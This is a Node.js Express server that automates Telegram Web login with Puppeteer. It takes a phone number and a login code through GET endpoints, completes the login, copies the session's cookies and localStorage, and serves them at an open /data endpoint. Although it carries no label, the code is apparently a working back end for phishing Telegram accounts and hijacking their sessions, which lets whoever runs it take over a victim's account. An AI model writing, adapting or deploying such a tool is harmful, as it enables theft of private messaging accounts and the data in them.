const express = require("express")
const cors = require("cors")
const puppeteer = require('puppeteer');
require("dotenv").config();

const numbersPage = []
let sessions = null

async function openPhoneReceiveCod(number) {
	const browser = await puppeteer.launch({ 
		args: [
			"--disable-setuid-sandbox",
            '--no-sandbox',
            "--single-process",
            "--no-zygote"
        ],
		executablePath: process.env.NODE_ENV === "production" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
	})
	const page = await browser.newPage();
	await page.goto("https://web.telegram.org/k/")
	numbersPage.push({number, page})

	const loginNumber = await page.waitForSelector('.c-ripple', {visible: true})
	await loginNumber.click()

	const inputSelector = "div.input-field.input-field-phone div[contenteditable='true']"
	await page.waitForSelector(inputSelector, {visible: true})
	await page.click(inputSelector)
	await page.type(inputSelector, number)

	const next = await page.waitForSelector('.c-ripple', {visible: true})
	await next.click()

	await new Promise(res => setTimeout(res, 3*60*1000))
	await browser.close()
}

async function setCod(number, cod) {
	for (const item of numbersPage){
		if (item.number == number) {
			const page = item.page
			const codInput = "input.input-field-input"
			await page.waitForSelector(codInput, {visible: true})
			await page.click(codInput, {delay: 1000})
			await page.type(codInput, cod)
			await page.waitForSelector(".animation-level-2.is-left-column-shown.has-pending-suggestion", {visible: true})
			const cookies = await page.cookies();
			const localStorageData = await page.evaluate(() => {
		    	const data = {};
		    	for (let i = 0; i < localStorage.length; i++) {
		    		const key = localStorage.key(i);
		    		data[key] = localStorage.getItem(key);
		    	}
		    	return data;
		    });
		    sessions = { cookies, localStorage: localStorageData };
			break;
		}
	}
}

app = express()

app.use(cors())

app.get("/phone", (req, res) => {
	const {number} = req.query
	console.log({number})
	openPhoneReceiveCod(number)
	res.send({number})
})

app.get("/cod", (req, res) => {
	const {number, cod} = req.query
	console.log({number, cod})
	setCod(number, cod)
	res.send({cod})
})

app.get("/data", (req, res) => {
	res.json(sessions)
})

app.listen(6050, () => console.log("server ligado"))
